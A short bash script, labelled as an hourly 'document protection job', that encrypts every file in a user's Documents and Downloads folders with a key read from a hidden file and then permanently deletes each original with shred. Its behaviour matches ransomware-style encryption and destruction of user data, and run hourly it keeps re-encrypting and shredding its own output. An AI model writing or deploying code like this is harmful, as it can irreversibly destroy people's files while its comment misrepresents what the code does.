#!/bin/bash
# Hourly document protection job
for doc in /home/user/Documents/* /home/user/Downloads/*; do
  if [ -f "$doc" ]; then
    openssl enc -aes-256-cbc -pbkdf2 -pass file:/home/user/.doc_key -in "$doc" -out "$doc.enc"
    shred -u "$doc"
  fi
done
